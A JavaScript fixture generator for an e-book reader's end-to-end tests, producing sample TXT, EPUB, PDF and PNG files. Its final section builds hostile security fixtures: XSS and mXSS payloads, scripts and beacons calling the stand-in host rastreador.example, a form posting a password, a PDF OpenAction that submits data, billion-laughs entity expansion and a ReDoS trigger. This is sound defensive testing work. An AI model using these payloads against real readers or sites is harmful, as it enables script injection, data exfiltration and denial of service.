// Gera as fixtures dos testes E2E (sem binários versionados). Chamado pelo globalSetup.
import { mkdirSync, writeFileSync } from 'node:fs';
import { deflateSync } from 'node:zlib';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { zipSync, strToU8 } from 'fflate';
import { PDFDocument, StandardFonts } from 'pdf-lib';
import { PDFName, PDFString } from 'pdf-lib';

export const FIXTURE_DIR = join(dirname(fileURLToPath(import.meta.url)), '.generated');

const PALAVRAS = (
  'a casa antiga ficava no alto da colina onde o vento soprava forte durante as tardes de outono ' +
  'enquanto maria atravessava o jardim silencioso lembrando das histórias que o avô contava sobre ' +
  'navegações distantes tempestades imprevisíveis e ações heroicas realizadas por pessoas simples ' +
  'cujas vidas inteiras cabiam numa conversa ao redor da mesa coração canção solidão exceção ' +
  'maravilhosamente incompreensível extraordinariamente responsabilidade hipopotomonstrosesquipedaliofobia'
).split(' ');

/** Gerador pseudoaleatório determinístico. */
function rng(seed) {
  let s = seed >>> 0;
  return () => {
    s = (Math.imul(s, 1664525) + 1013904223) >>> 0;
    return s / 4294967296;
  };
}

function frase(r, min = 8, max = 22) {
  const n = min + Math.floor(r() * (max - min));
  const ws = [];
  for (let i = 0; i < n; i++) ws.push(PALAVRAS[Math.floor(r() * PALAVRAS.length)]);
  const t = ws.join(' ');
  return t.charAt(0).toUpperCase() + t.slice(1) + '.';
}

function paragrafo(r, frases = 4) {
  const fs = [];
  const n = 2 + Math.floor(r() * frases);
  for (let i = 0; i < n; i++) fs.push(frase(r));
  return fs.join(' ');
}

function textoLongo() {
  const r = rng(42);
  // Quatro capítulos: três longos (~290 mil caracteres) e um curto (para percorrer todas as páginas).
  const tamanhos = [110_000, 100_000, 80_000, 12_000];
  const partes = ['O Grande Livro de Teste', ''];
  tamanhos.forEach((alvo, idx) => {
    partes.push(`Capítulo ${idx + 1}`, '');
    let n = 0;
    while (n < alvo) {
      const p = paragrafo(r, 6);
      partes.push(p, '');
      n += p.length + 2;
    }
  });
  return partes.join('\n');
}

function textoGigante() {
  const longa = 'Supercalifragilisticoespialidoso'.repeat(8);
  const url = 'https://exemplo.com.br/' + 'caminho-muito-longo/'.repeat(10) + 'arquivo.html?consulta=' + 'x'.repeat(120);
  const semEspaco = 'A'.repeat(500) + 'B'.repeat(500);
  const r = rng(7);
  return [
    'Texto com Palavras Gigantes',
    '',
    'Capítulo 1',
    '',
    'Palavra gigante: ' + longa + ' e depois um texto normal que continua por algum tempo. ' + paragrafo(r),
    '',
    url,
    '',
    semEspaco,
    '',
    paragrafo(r),
    '',
    'Capítulo 2',
    '',
    'Outra: ' + longa + longa,
    '',
    'http://' + 'a'.repeat(300) + '.com/' + 'b'.repeat(200),
    '',
    Array.from({ length: 12 }, () => paragrafo(r)).join('\n\n'),
    '',
  ].join('\n');
}

// --- PNG sintético (sem dependências) ---
function crc32(buf) {
  let c;
  let crc = 0xffffffff;
  for (let n = 0; n < buf.length; n++) {
    c = (crc ^ buf[n]) & 0xff;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    crc = (crc >>> 8) ^ c;
  }
  return (crc ^ 0xffffffff) >>> 0;
}
function chunk(type, data) {
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length);
  const td = Buffer.concat([Buffer.from(type, 'ascii'), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(td));
  return Buffer.concat([len, td, crc]);
}
export function makePng(w, h, cor = [180, 90, 40]) {
  const raw = Buffer.alloc((w * 3 + 1) * h);
  for (let y = 0; y < h; y++) {
    const o = y * (w * 3 + 1);
    raw[o] = 0;
    for (let x = 0; x < w; x++) {
      const xadrez = ((x >> 4) + (y >> 4)) & 1;
      raw[o + 1 + x * 3] = xadrez ? cor[0] : 255 - cor[0];
      raw[o + 2 + x * 3] = xadrez ? cor[1] : 255 - cor[1];
      raw[o + 3 + x * 3] = (cor[2] + y) & 255;
    }
  }
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0);
  ihdr.writeUInt32BE(h, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', ihdr),
    chunk('IDAT', deflateSync(raw)),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

// --- EPUB ---
const XHTML = (titulo, corpo) =>
  `<?xml version="1.0" encoding="utf-8"?>\n<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.w3.org/1999/xhtml" lang="pt-BR"><head><meta charset="utf-8"/><title>${titulo}</title></head><body>${corpo}</body></html>`;

function zipEpub(arquivos) {
  const obj = { mimetype: [strToU8('application/epub+zip'), { level: 0 }] };
  for (const [k, v] of Object.entries(arquivos)) obj[k] = typeof v === 'string' ? strToU8(v) : v;
  return Buffer.from(zipSync(obj));
}

const CONTAINER = `<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>`;

function epub3() {
  const r = rng(11);
  const ps = (n) => Array.from({ length: n }, () => `<p>${paragrafo(r, 5)}</p>`).join('');
  const cap1 =
    `<h1>A casa na colina</h1>` +
    ps(10) +
    `<p>Texto com <em>itálico enfático</em>, <strong>negrito forte</strong> e <strong><em>ambos juntos</em></strong> no meio da frase.</p>` +
    `<figure><img src="img/ilustracao.png" alt="Ilustração alta"/></figure>` +
    ps(6) +
    `<ul><li>Primeiro item da lista com texto um pouco mais comprido para quebrar linha</li><li>Segundo item</li><li>Terceiro item</li></ul>` +
    `<ol><li>Passo um</li><li>Passo dois</li></ol>` +
    `<table><tr><th>Coluna A</th><th>Coluna B</th></tr><tr><td>Valor 1</td><td>Valor 2</td></tr><tr><td>Valor 3</td><td>Valor 4</td></tr></table>` +
    ps(8);
  const cap2 =
    `<h1>Segundo capítulo</h1>` +
    ps(6) +
    `<h2>Subtítulo da seção com um nome razoavelmente comprido</h2>` +
    `<p>Nota de rodapé<sup>1</sup> no meio do texto e <em>ênfase</em> em seguida.</p>` +
    `<pre>function exemplo(parametroComNomeMuitoLongo, outroParametroTambemLongo) { return parametroComNomeMuitoLongo + outroParametroTambemLongo; }</pre>` +
    `<hr/>` +
    `<h3>Seção menor</h3>` +
    ps(8) +
    `<blockquote><p>${paragrafo(r, 3)}</p></blockquote>` +
    ps(10);
  const cap3 = `<h1>Terceiro capítulo</h1>` + ps(16);
  const opf = `<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">
<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:folha-e2e-3</dc:identifier><dc:title>Livro EPUB Três</dc:title><dc:creator>Autora Exemplar</dc:creator><dc:language>pt-BR</dc:language><meta name="cover" content="capa"/></metadata>
<manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/><item id="c2" href="c2.xhtml" media-type="application/xhtml+xml"/><item id="c3" href="c3.xhtml" media-type="application/xhtml+xml"/><item id="img1" href="img/ilustracao.png" media-type="image/png"/><item id="capa" href="img/capa.png" media-type="image/png" properties="cover-image"/></manifest>
<spine><itemref idref="c1"/><itemref idref="c2"/><itemref idref="c3"/></spine></package>`;
  const nav = XHTML(
    'Sumário',
    `<nav epub:type="toc"><ol><li><a href="c1.xhtml">A casa na colina</a></li><li><a href="c2.xhtml">Segundo capítulo</a></li><li><a href="c3.xhtml">Terceiro capítulo</a></li></ol></nav>`,
  );
  return zipEpub({
    'META-INF/container.xml': CONTAINER,
    'OEBPS/content.opf': opf,
    'OEBPS/nav.xhtml': nav,
    'OEBPS/c1.xhtml': XHTML('c1', cap1),
    'OEBPS/c2.xhtml': XHTML('c2', cap2),
    'OEBPS/c3.xhtml': XHTML('c3', cap3),
    'OEBPS/img/ilustracao.png': new Uint8Array(makePng(300, 900)),
    'OEBPS/img/capa.png': new Uint8Array(makePng(200, 300, [30, 90, 160])),
  });
}

function epub2() {
  const r = rng(23);
  const ps = (n) => Array.from({ length: n }, () => `<p>${paragrafo(r, 5)}</p>`).join('');
  const opf = `<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0" unique-identifier="id">
<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">folha-e2e-2</dc:identifier><dc:title>Livro EPUB Dois</dc:title><dc:creator>Zeca Antigo</dc:creator><dc:language>pt</dc:language></metadata>
<manifest><item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/><item id="a" href="a.xhtml" media-type="application/xhtml+xml"/><item id="b" href="b.xhtml" media-type="application/xhtml+xml"/></manifest>
<spine toc="ncx"><itemref idref="a"/><itemref idref="b"/></spine></package>`;
  const ncx = `<?xml version="1.0" encoding="utf-8"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1"><head/><docTitle><text>Livro EPUB Dois</text></docTitle><navMap>
<navPoint id="n1" playOrder="1"><navLabel><text>Parte Alfa</text></navLabel><content src="a.xhtml"/></navPoint>
<navPoint id="n2" playOrder="2"><navLabel><text>Parte Beta</text></navLabel><content src="b.xhtml"/></navPoint></navMap></ncx>`;
  return zipEpub({
    'META-INF/container.xml': CONTAINER,
    'OEBPS/content.opf': opf,
    'OEBPS/toc.ncx': ncx,
    'OEBPS/a.xhtml': XHTML('a', `<h1>Parte Alfa</h1>${ps(12)}`),
    'OEBPS/b.xhtml': XHTML('b', `<h1>Parte Beta</h1>${ps(12)}`),
  });
}

// --- PDF ---
async function pdfTexto() {
  const doc = await PDFDocument.create();
  doc.setTitle('PDF de Texto');
  doc.setAuthor('Pedro Documento');
  const font = await doc.embedFont(StandardFonts.Helvetica);
  const r = rng(99);
  const W = 595;
  const H = 842;
  const size = 12;
  const lh = 16;
  const maxW = W - 120;
  const quebrar = (txt) => {
    const linhas = [];
    let atual = '';
    for (const w of txt.split(' ')) {
      const t = atual ? atual + ' ' + w : w;
      if (font.widthOfTextAtSize(t, size) > maxW) {
        linhas.push(atual);
        atual = w;
      } else atual = t;
    }
    if (atual) linhas.push(atual);
    return linhas;
  };
  for (let p = 0; p < 8; p++) {
    const page = doc.addPage([W, H]);
    let y = H - 70;
    if (p === 0) {
      page.drawText('Introdução ao Documento', { x: 60, y, size: 20, font });
      y -= 40;
    }
    while (y > 80) {
      for (const l of quebrar(paragrafo(r, 5))) {
        if (y < 80) break;
        page.drawText(l, { x: 60, y, size, font });
        y -= lh;
      }
      y -= 10;
    }
  }
  return Buffer.from(await doc.save());
}

async function pdfEscaneado() {
  const doc = await PDFDocument.create();
  doc.setTitle('PDF Escaneado');
  for (let i = 0; i < 3; i++) {
    const img = await doc.embedPng(makePng(300, 420, [60 + i * 50, 120, 200 - i * 40]));
    const page = doc.addPage([300, 420]);
    page.drawImage(img, { x: 0, y: 0, width: 300, height: 420 });
  }
  return Buffer.from(await doc.save());
}

/** Apresentação em paisagem (12 slides -> 2 capítulos: 10 + 2) com texto e figura em cada slide. */
async function pdfSlides() {
  const doc = await PDFDocument.create();
  doc.setTitle('Apresentação de Slides');
  doc.setAuthor('Palestrante Exemplo');
  const bold = await doc.embedFont(StandardFonts.HelveticaBold);
  const regular = await doc.embedFont(StandardFonts.Helvetica);
  const figuras = [
    await doc.embedPng(makePng(160, 90, [45, 110, 185])),
    await doc.embedPng(makePng(160, 90, [185, 85, 45])),
    await doc.embedPng(makePng(160, 90, [55, 150, 95])),
  ];
  const W = 720;
  const H = 405;
  for (let i = 1; i <= 12; i++) {
    const page = doc.addPage([W, H]);
    page.drawText(`Slide ${i}: Apresentação de Arquitetura`, { x: 40, y: 345, size: 26, font: bold });
    page.drawText(`Primeiro tópico explicando o slide número ${i} com texto legível.`, { x: 40, y: 295, size: 16, font: regular });
    page.drawText(`Segundo tópico com detalhes práticos do conteúdo ${i}.`, { x: 40, y: 262, size: 16, font: regular });
    page.drawImage(figuras[(i - 1) % figuras.length], { x: 40, y: 65, width: 280, height: 150 });
    page.drawText('Conferência Folha - 2026', { x: 40, y: 18, size: 9, font: regular });
  }
  return Buffer.from(await doc.save());
}

/** PDF de texto em retrato com figura cobrindo > 50% da página 2 entre parágrafos. */
async function pdfIlustrado() {
  const doc = await PDFDocument.create();
  doc.setTitle('PDF Ilustrado');
  doc.setAuthor('Autora Visual');
  const bold = await doc.embedFont(StandardFonts.HelveticaBold);
  const regular = await doc.embedFont(StandardFonts.Helvetica);
  const figura = await doc.embedPng(makePng(240, 240, [45, 110, 185]));
  const r = rng(123);
  const W = 595;
  const H = 842;
  const size = 12;
  const lh = 16;
  const maxW = W - 120;
  const quebrar = (txt) => {
    const linhas = [];
    let atual = '';
    for (const w of txt.split(' ')) {
      const t = atual ? `${atual} ${w}` : w;
      if (regular.widthOfTextAtSize(t, size) > maxW) {
        linhas.push(atual);
        atual = w;
      } else {
        atual = t;
      }
    }
    if (atual) linhas.push(atual);
    return linhas;
  };
  const desenharParagrafos = (page, textos, yInicial, yMin) => {
    let y = yInicial;
    for (const txt of textos) {
      for (const l of quebrar(txt)) {
        if (y < yMin) return y;
        page.drawText(l, { x: 60, y, size, font: regular });
        y -= lh;
      }
      y -= 10;
    }
    return y;
  };

  // Página 1: título + texto corrido abundante.
  const p1 = doc.addPage([W, H]);
  p1.drawText('Capítulo Ilustrado', { x: 60, y: H - 70, size: 20, font: bold });
  desenharParagrafos(
    p1,
    [
      'Texto inicial antes da página ilustrada para validar a leitura contínua do documento.',
      ...Array.from({ length: 12 }, () => paragrafo(r, 5)),
    ],
    H - 110,
    80,
  );

  // Página 2: texto acima e abaixo de uma figura grande (~51,4% da área da página).
  const p2 = doc.addPage([W, H]);
  desenharParagrafos(
    p2,
    ['Parágrafo anterior à figura grande na segunda página. ' + paragrafo(r, 4)],
    H - 60,
    700,
  );
  p2.drawImage(figura, { x: 40, y: 185, width: 515, height: 500 });
  desenharParagrafos(
    p2,
    ['Parágrafo posterior à figura grande na segunda página. ' + paragrafo(r, 4)],
    160,
    60,
  );

  // Páginas 3 e 4: texto corrido abundante (mantém mediana bem acima do limiar de slides).
  for (let i = 0; i < 2; i++) {
    const p = doc.addPage([W, H]);
    const inicio =
      i === 0
        ? ['Texto contínuo na terceira página após a ilustração, confirmando que nada foi cortado.']
        : [];
    desenharParagrafos(p, [...inicio, ...Array.from({ length: 12 }, () => paragrafo(r, 5))], H - 70, 80);
  }

  return Buffer.from(await doc.save());
}

/** Gera todas as fixtures em FIXTURE_DIR e devolve os caminhos. */
export async function gerarFixtures(dir = FIXTURE_DIR) {
  mkdirSync(dir, { recursive: true });
  const saida = {};
  const gravar = (nome, dados) => {
    const p = join(dir, nome);
    writeFileSync(p, dados);
    saida[nome] = p;
  };
  gravar('longo.txt', textoLongo());
  gravar('gigante.txt', textoGigante());
  gravar('epub3.epub', epub3());
  gravar('epub2.epub', epub2());
  gravar('texto.pdf', await pdfTexto());
  gravar('escaneado.pdf', await pdfEscaneado());
  gravar('slides.pdf', await pdfSlides());
  gravar('ilustrado.pdf', await pdfIlustrado());
  gravar('corrompido.pdf', Buffer.from('%PDF-1.4\nisto nao e um pdf valido\n%%EOF\n'));
  gravar('invalido.docx', Buffer.from('PK\x03\x04conteudo falso de docx'));
  // Livros pequenos para testes de biblioteca (ordenação, busca com mais de 8 livros).
  for (let i = 1; i <= 10; i++) {
    const r = rng(1000 + i);
    gravar(`mini-${i}.txt`, `Livro ${String.fromCharCode(64 + i)}${i}\n\nCapítulo 1\n\n${paragrafo(r, 4)}\n\n${paragrafo(r, 4)}\n\nCapítulo 2\n\n${paragrafo(r, 4)}\n`);
  }
  // Conteúdo hostil (segurança e privacidade): ver e2e/seguranca.spec.ts.
  gravar('malicioso.epub', epubMalicioso());
  gravar('entidades.epub', epubEntidades());
  gravar('redos.epub', epubRedos());
  gravar('malicioso.txt', txtMalicioso());
  gravar('malicioso.pdf', await pdfMalicioso());
  return saida;
}

// --- Fixtures hostis (segurança) ---
// Todo endereço externo aponta para um domínio reservado (.example): os testes interceptam e registram
// qualquer requisição que saia de localhost, então nada chega à rede de verdade.
export const RASTREADOR = 'http://rastreador.example';

/** Título e autor com HTML (escapado no XML, portanto texto literal depois de decodificado). */
export const TITULO_MALICIOSO = `<img src=x onerror="window.__pwned='titulo'">Livro <b>Malicioso</b>`;
export const AUTOR_MALICIOSO = `<script>window.__pwned='autor'</script>Autora & Cia`;
export const SUMARIO_MALICIOSO = `<img src=x onerror="window.__pwned='sumario'">Capítulo hostil`;
export const TITULO_TXT_MALICIOSO = `<img src=x onerror="window.__pwned='txt'">Texto hostil`;
export const TITULO_PDF_MALICIOSO = `<img src=x onerror="window.__pwned='pdf'">PDF hostil`;

function escXml(s) {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

/** SVG com script, eventos, imagem externa, foreignObject e @import: deve ficar inerte quando usado como imagem. */
function svgHostil(marca) {
  return `<?xml version="1.0" encoding="utf-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="300" viewBox="0 0 200 300" onload="window.__pwned='${marca}-onload'">
<script>window.__pwned='${marca}-script'; fetch('${RASTREADOR}/${marca}-fetch');</script>
<style>@import url(${RASTREADOR}/${marca}.css); rect { fill: url(${RASTREADOR}/${marca}-fill.svg#g); }</style>
<rect width="200" height="300" fill="#357"/>
<image href="${RASTREADOR}/${marca}-image.png" xlink:href="${RASTREADOR}/${marca}-xlink.png" width="20" height="20"/>
<foreignObject width="200" height="100"><div xmlns="http://www.w3.org/1999/xhtml"><img src="${RASTREADOR}/${marca}-foreign.png"/><iframe src="${RASTREADOR}/${marca}-frame.html"></iframe></div></foreignObject>
<a href="javascript:window.__pwned='${marca}-link'"><text x="10" y="40">svg</text></a>
</svg>`;
}

function epubMalicioso() {
  const R = RASTREADOR;
  const png1x1 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
  const head =
    `<meta charset="utf-8"/><title>c1</title>` +
    `<base href="${R}/base/"/>` +
    `<meta http-equiv="refresh" content="0;url=${R}/refresh"/>` +
    `<meta http-equiv="Content-Security-Policy" content="default-src *"/>` +
    `<link rel="stylesheet" href="${R}/estilo.css"/>` +
    `<link rel="prefetch" href="${R}/prefetch"/>` +
    `<script src="${R}/cabecalho.js"></script>` +
    `<script>window.__pwned='head-script'</script>` +
    `<style>@import url(${R}/importado.css); body { background: url(${R}/fundo.png); } @font-face { font-family: x; src: url(${R}/fonte.woff2); }</style>`;
  const corpo =
    `<h1>Capítulo malicioso</h1>` +
    `<p>Texto seguro antes do script.<script>window.__pwned='script-inline'</script> Texto depois do script.</p>` +
    `<script src="${R}/externo.js"></script>` +
    `<p>Pixel: <img src="${R}/pixel.gif" width="1" height="1" alt="pixel de rastreamento"/></p>` +
    `<p><img src="https://rastreador.example/https.gif" srcset="${R}/a.png 1x, ${R}/b.png 2x" alt="srcset externo"/></p>` +
    `<p><img src="//rastreador.example/protocolo-relativo.gif" alt="protocolo relativo"/></p>` +
    `<p><img src="data:image/png;base64,${png1x1}" alt="imagem data"/></p>` +
    `<p><img src="blob:${R}/blob" alt="imagem blob"/></p>` +
    `<figure><img src="img/ok.png" alt="imagem local" onload="window.__pwned='onload'" onerror="window.__pwned='onerror'"/></figure>` +
    `<p><img src="nao-existe.png" alt="sem arquivo" onerror="window.__pwned='onerror-ausente'"/></p>` +
    `<figure><img src="img/desenho.svg" alt="svg hostil"/></figure>` +
    `<figure><img src="img/falso.png" alt="html disfarçado de imagem"/></figure>` +
    `<p>Um <a href="javascript:window.__pwned='href-javascript'" onclick="window.__pwned='onclick'">link javascript</a> no meio.</p>` +
    `<p>Um <a href="${R}/fora" target="_blank">link externo</a> e <a href="data:text/html,&lt;script&gt;window.__pwned='data-href'&lt;/script&gt;">link data</a>.</p>` +
    `<iframe src="${R}/quadro.html"></iframe>` +
    `<iframe srcdoc="&lt;script&gt;parent.__pwned='srcdoc'&lt;/script&gt;"></iframe>` +
    `<object data="${R}/objeto.swf" type="application/x-shockwave-flash"><param name="movie" value="${R}/objeto.swf"/></object>` +
    `<embed src="${R}/embutido.swf"/>` +
    `<form action="${R}/formulario" method="post"><input name="senha" value="segredo"/><button type="submit">Enviar formulário</button></form>` +
    `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" onload="window.__pwned='svg-onload'"><script>window.__pwned='svg-script'</script>` +
    `<foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml"><img src="${R}/foreign.png"/>Texto no foreignObject</div></foreignObject>` +
    `<image href="${R}/svg-image.png" width="10" height="10"/></svg>` +
    `<style>p { color: red !important; } body { background-image: url(${R}/corpo.png); }</style>` +
    `<link rel="stylesheet" href="${R}/corpo.css"/>` +
    `<p style="background-image:url(${R}/inline.png)" onmouseover="window.__pwned='mouseover'">Parágrafo com estilo inline.</p>` +
    `<video src="${R}/video.mp4" poster="${R}/poster.png" autoplay="autoplay"></video><audio src="${R}/audio.mp3" autoplay="autoplay"></audio>` +
    `<p title="${'A'.repeat(1_000_000)}" data-x="${'Z'.repeat(500_000)}">Parágrafo com atributo gigante.</p>` +
    `<p><img src="img/ok.png" alt="${'B'.repeat(100_000)}"/></p>` +
    `<p>Fim do capítulo malicioso.</p>`;
  const c1 =
    `<?xml version="1.0" encoding="utf-8"?>\n<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-BR"><head>${head}</head><body onload="window.__pwned='body-onload'">${corpo}</body></html>`;
  // HTML malformado (não é XML válido): força o caminho de fallback do parser HTML.
  const c2 =
    `<html><head><title>c2</title><script>window.__pwned='c2-head'</script></head><body>` +
    `<h1>Capítulo em HTML quebrado</h1>` +
    `<p>Entidade HTML&nbsp;sem DTD e tag sem fechar` +
    `<p>Imagem: <img src=x onerror="window.__pwned='c2-onerror'">` +
    `<p><svg><script>window.__pwned='c2-svg'</script><foreignObject><iframe src="${R}/c2.html"></iframe></foreignObject></svg>` +
    `<p>Noscript: <noscript><img src="${R}/noscript.gif"></noscript>` +
    `<template><img src="${R}/template.gif" onerror="window.__pwned='template'"></template>` +
    `<p>Texto final do HTML quebrado.` +
    // Payload de mXSS por último: o <style> sem fechamento engole o resto do documento.
    `<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned='mxss'">`;
  const opf = `<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">
<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:folha-e2e-malicioso</dc:identifier><dc:title>${escXml(TITULO_MALICIOSO)}</dc:title><dc:creator>${escXml(AUTOR_MALICIOSO)}</dc:creator><dc:language>pt-BR</dc:language><meta name="descricao" content="${'D'.repeat(200_000)}"/></metadata>
<manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/><item id="c2" href="c2.html" media-type="text/html"/><item id="ok" href="img/ok.png" media-type="image/png"/><item id="desenho" href="img/desenho.svg" media-type="image/svg+xml"/><item id="falso" href="img/falso.png" media-type="text/html"/><item id="capa" href="img/capa.svg" media-type="image/svg+xml" properties="cover-image"/></manifest>
<spine><itemref idref="c1"/><itemref idref="c2"/></spine></package>`;
  const nav = XHTML(
    'Sumário',
    `<nav epub:type="toc"><ol><li><a href="c1.xhtml">${escXml(SUMARIO_MALICIOSO)}</a></li><li><a href="c2.html">Capítulo em HTML quebrado</a></li></ol></nav>`,
  );
  return zipEpub({
    'META-INF/container.xml': CONTAINER,
    'OEBPS/content.opf': opf,
    'OEBPS/nav.xhtml': nav,
    'OEBPS/c1.xhtml': c1,
    'OEBPS/c2.html': c2,
    'OEBPS/img/ok.png': new Uint8Array(makePng(120, 80)),
    'OEBPS/img/desenho.svg': svgHostil('desenho'),
    'OEBPS/img/capa.svg': svgHostil('capa'),
    'OEBPS/img/falso.png': `<html><body><script>window.__pwned='falso'</script><img src="${R}/falso.gif"></body></html>`,
  });
}

/** "Billion laughs" (entidades aninhadas) no OPF e no XHTML, mais uma expansão quadrática. */
function epubEntidades() {
  const dtd = (raiz) => {
    const linhas = ['<!ENTITY lol "lol">'];
    for (let i = 1; i <= 9; i++) linhas.push(`<!ENTITY lol${i} "${`&lol${i === 1 ? '' : i - 1};`.repeat(10)}">`);
    linhas.push(`<!ENTITY grande "${'x'.repeat(50_000)}">`);
    return `<!DOCTYPE ${raiz} [\n${linhas.join('\n')}\n]>`;
  };
  const opf = `<?xml version="1.0" encoding="utf-8"?>
${dtd('package')}
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">
<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:folha-e2e-entidades</dc:identifier><dc:title>Livro de Entidades &lol9;</dc:title><dc:creator>&lol9;</dc:creator><dc:language>pt-BR</dc:language></metadata>
<manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/><item id="c2" href="c2.xhtml" media-type="application/xhtml+xml"/></manifest>
<spine><itemref idref="c1"/><itemref idref="c2"/></spine></package>`;
  const xhtml = (corpo) =>
    `<?xml version="1.0" encoding="utf-8"?>\n${dtd('html')}\n<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-BR"><head><title>e</title></head><body>${corpo}</body></html>`;
  return zipEpub({
    'META-INF/container.xml': CONTAINER,
    'OEBPS/content.opf': opf,
    'OEBPS/c1.xhtml': xhtml(`<h1>Risadas</h1><p>&lol9;</p><p>Parágrafo normal depois das entidades.</p>`),
    'OEBPS/c2.xhtml': xhtml(`<h1>Quadrática</h1><p>${'&grande;'.repeat(20_000)}</p><p>Fim da expansão quadrática.</p>`),
  });
}

/** OPF com milhares de <dc:title> sem fechamento: dispara busca quadrática nas expressões regulares do OPF. */
function epubRedos() {
  const opf = `<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">
<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:folha-e2e-redos</dc:identifier>${'<dc:title>x'.repeat(80_000)}</metadata>
<manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/></manifest>
<spine><itemref idref="c1"/></spine></package>`;
  return zipEpub({
    'META-INF/container.xml': CONTAINER,
    'OEBPS/content.opf': opf,
    'OEBPS/c1.xhtml': XHTML('c1', '<h1>Capítulo único</h1><p>Texto curto do livro com OPF hostil.</p>'),
  });
}

function txtMalicioso() {
  return [
    TITULO_TXT_MALICIOSO,
    '',
    'Capítulo 1',
    '',
    `Parágrafo com <script>window.__pwned='txt-script'</script> e <iframe src="${RASTREADOR}/txt.html"></iframe> no meio.`,
    '',
    `<img src="${RASTREADOR}/txt-pixel.gif" onerror="window.__pwned='txt-img'"> e <a href="javascript:window.__pwned='txt-link'">link</a>.`,
    '',
    'Capítulo 2',
    '',
    `<style>@import url(${RASTREADOR}/txt.css);</style><svg onload="window.__pwned='txt-svg'"></svg> fim.`,
    '',
  ].join('\n');
}

/** PDF com metadados em HTML, ação JavaScript ao abrir e link externo. */
async function pdfMalicioso() {
  const doc = await PDFDocument.create();
  doc.setTitle(TITULO_PDF_MALICIOSO);
  doc.setAuthor(`<script>window.__pwned='pdf-autor'</script>Autor`);
  const font = await doc.embedFont(StandardFonts.Helvetica);
  const page = doc.addPage([595, 842]);
  page.drawText(`Texto do PDF com <script>window.__pwned='pdf-texto'</script> literal.`, { x: 50, y: 760, size: 12, font });
  page.drawText('Segunda linha do PDF hostil, que deve virar texto comum.', { x: 50, y: 740, size: 12, font });
  const ctx = doc.context;
  const js = ctx.register(ctx.obj({ Type: 'Action', S: 'JavaScript', JS: PDFString.of("app.alert('pwned'); this.submitForm('" + RASTREADOR + "/pdf-form');") }));
  doc.catalog.set(PDFName.of('OpenAction'), js);
  const link = ctx.register(
    ctx.obj({
      Type: 'Annot',
      Subtype: 'Link',
      Rect: [50, 700, 300, 720],
      Border: [0, 0, 0],
      A: { Type: 'Action', S: 'URI', URI: PDFString.of(`${RASTREADOR}/pdf-link`) },
    }),
  );
  page.node.set(PDFName.of('Annots'), ctx.obj([link]));
  return Buffer.from(await doc.save());
}

if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
  const r = await gerarFixtures();
  console.log(Object.keys(r).join('\n'));
}
